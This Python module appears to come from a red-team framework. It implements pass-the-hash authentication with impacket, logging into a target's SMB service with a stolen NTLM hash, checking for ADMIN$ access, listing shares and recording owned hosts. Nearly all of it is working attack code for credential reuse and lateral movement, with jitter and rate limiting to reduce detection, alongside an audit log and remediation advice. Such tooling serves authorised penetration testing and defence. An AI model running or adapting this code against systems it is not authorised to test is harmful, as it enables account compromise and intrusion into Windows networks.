"""
Pass-the-Hash Authentication
MITRE: T1550.002

Uses NTLM hash directly for authentication without knowing the plaintext password.
Implemented via impacket's NTLM hash-based login (wmiexec/smbexec approach).

Requires: NTLM hash, target host.
"""
from __future__ import annotations

import asyncio
from typing import Any

from ares.core.logger import get_logger, audit
from ares.core.campaign import Finding, Severity
from ares.modules.base import BaseModule, OpsecLevel
from ares.core.tracing import trace_module

logger = get_logger("ares.modules.credential.pass_the_hash")


class PassTheHashModule(BaseModule):
    """
    credential.pass_the_hash — Authenticate to target using NTLM hash — no plaintext password required"

    OPSEC: MEDIUM
    MITRE: "T1550.002"
    REQUIRES: "ntlm_hashes"
    OUTPUTS:  "valid_credentials", "owned_hosts"
    """
    MODULE_ID          = "credential.pass_the_hash"
    MODULE_NAME        = "Pass-the-Hash"
    MODULE_CATEGORY    = "credential"
    MODULE_DESCRIPTION = (
        "Authenticate to target using NTLM hash — "
        "no plaintext password required"
    )
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    OPSEC_LEVEL        = OpsecLevel.MEDIUM
    REQUIRES           = ["ntlm_hashes"]
    OUTPUTS            = ["valid_credentials", "owned_hosts"]
    MITRE_TECHNIQUES   = ["T1550.002"]

    async def validate(self, ctx: "Any") -> None:
        """Enforce target and NTLM hash before any SMB connection."""
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        if not isinstance(ctx, ExecutionContext):
            return
        target  = getattr(ctx, "target", "") or ctx.params.get("target", "")
        nt_hash = ctx.params.get("nt_hash", "") or ctx.params.get("hash", "")
        if not target:
            raise ModuleValidationError(
                "credential.pass_the_hash requires 'target' — "
                "IP or hostname of the host to authenticate against.",
                module_id=self.MODULE_ID, field="target",
            )
        if not nt_hash:
            raise ModuleValidationError(
                "credential.pass_the_hash requires 'nt_hash' — "
                "the 32-character NT hash from ad.dcsync output.",
                module_id=self.MODULE_ID, field="nt_hash",
            )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+).
        Thin adapter: extract params from ctx → call run() → return ModuleResult.
        """
        from ares.modules.base import ModuleResult
        if getattr(ctx, "dry_run", False):
            return ModuleResult(status="dry_run", module_id=self.MODULE_ID, raw={"dry_run": True})
        target    = getattr(ctx, "target", ctx.params.get("target", ""))
        username  = ctx.params.get("username", "Administrator")
        nt_hash   = ctx.params.get("nt_hash", "") or ctx.params.get("hash", "")
        lm_hash   = ctx.params.get("lm_hash", "aad3b435b51404eeaad3b435b51404ee")
        domain    = getattr(ctx, "domain", "") or ctx.params.get("domain", "")
        command   = ctx.params.get("command", "whoami /all")
        findings, raw = await self.run(
            target=target, username=username, nt_hash=nt_hash,
            lm_hash=lm_hash, domain=domain, command=command
        )
        return ModuleResult(
            status="success" if findings else "partial",
            findings=findings, raw=raw, module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("credential.pass_the_hash")
    async def run(self, **kwargs: Any) -> tuple[list[Finding], dict[str, Any]]:
        target   = kwargs.get("target", "")
        username = kwargs.get("username", "Administrator")
        nt_hash  = kwargs.get("nt_hash", "") or kwargs.get("hash", "")
        lm_hash  = kwargs.get("lm_hash", "aad3b435b51404eeaad3b435b51404ee")
        domain   = kwargs.get("domain", "")
        command  = kwargs.get("command", "whoami /all")
        dry_run  = kwargs.get("dry_run", False)

        if not target or not nt_hash:
            return [], {"error": "target and nt_hash required"}
        if dry_run:
            return [], {"dry_run": True}

        await self.before_request(target, "smb")  # scope check + jitter

        try:
            from impacket.smbconnection import SMBConnection  # type: ignore[import]
        except ImportError:
            return [], {"error": "impacket not installed"}

        logger.info("pass_the_hash_attempt", target=target, username=username)
        audit("pass_the_hash", actor="operator", technique="T1550.002",
              source="operator", target=target)
        await self.noise.rate_limiter.acquire("cloud_api")
        await self.noise.jitter.sleep()

        success   = False
        output    = ""
        privilege = "user"

        loop = asyncio.get_running_loop()

        def _pth() -> tuple[bool, str, str]:
            """
            Test NTLM hash auth via SMB. Classifies errors precisely:
              - STATUS_LOGON_FAILURE   → wrong hash (not an error to surface)
              - STATUS_ACCOUNT_LOCKED  → account locked (stop, surface as warning)
              - STATUS_ACCESS_DENIED   → valid hash but no admin access
              - ConnectionError/timeout → host unreachable
            """
            err_type = ""
            try:
                smb = SMBConnection(target, target, timeout=15)
                smb.login(username, "", domain, lm_hash, nt_hash)
                # Confirm admin access by connecting to ADMIN$
                try:
                    smb.disconnectTree(smb.connectTree("ADMIN$"))
                    priv = "local_admin"
                except Exception:
                    priv = "user"   # valid creds but no admin rights
                try:
                    shares = [s["shi1_netname"] for s in smb.listShares()]
                except Exception:
                    shares = []
                smb.logoff()
                return True, f"Authenticated. Privilege: {priv}. Shares: {shares[:5]}", priv
            except Exception as e:
                err = str(e).upper()
                if "STATUS_LOGON_FAILURE" in err or "WRONG_PASSWORD" in err:
                    return False, "wrong_hash", ""
                if "STATUS_ACCOUNT_LOCKED_OUT" in err or "ACCOUNT_LOCKED" in err:
                    return False, "account_locked", ""
                if "STATUS_ACCESS_DENIED" in err:
                    return False, "access_denied_no_admin", ""
                if "timed out" in err.lower() or "connection refused" in err.lower():
                    return False, "host_unreachable", ""
                return False, str(e)[:200], ""

        success, output, privilege = await loop.run_in_executor(None, _pth)

        if success:
            self.finding(
                title=f"Pass-the-Hash Successful: {domain}\\{username} on {target}",
                description=(
                    f"NTLM hash authentication succeeded for {domain}\\{username} on {target}. "
                    "The hash can be used for lateral movement without cracking the password."
                ),
                severity=Severity.CRITICAL,
                mitre_technique="T1550.002",
                mitre_tactic="Lateral Movement",
                evidence={
                    "target":   target,
                    "username": f"{domain}\\{username}",
                    "technique": "Pass-the-Hash (NTLM)",
                    "output":   output[:300],
                },
                remediation=(
                    "Enable Protected Users security group for all privileged accounts "
                    "(disables NTLM authentication for members). "
                    "Deploy Credential Guard to prevent NTLM hash extraction. "
                    "Consider disabling NTLMv1 and enforcing NTLMv2 minimum."
                ),
                host=target, confidence=1.0,
            )

        raw = {
            "target": target, "username": f"{domain}\\{username}",
            "success": success, "output": output, "privilege": privilege,
        }
        raw["valid_credentials"] = self._findings  # OUTPUTS key
        raw["owned_hosts"] = [{"host": raw.get("target", "")}] if self._findings else []  # OUTPUTS key
        return self._findings[:], raw
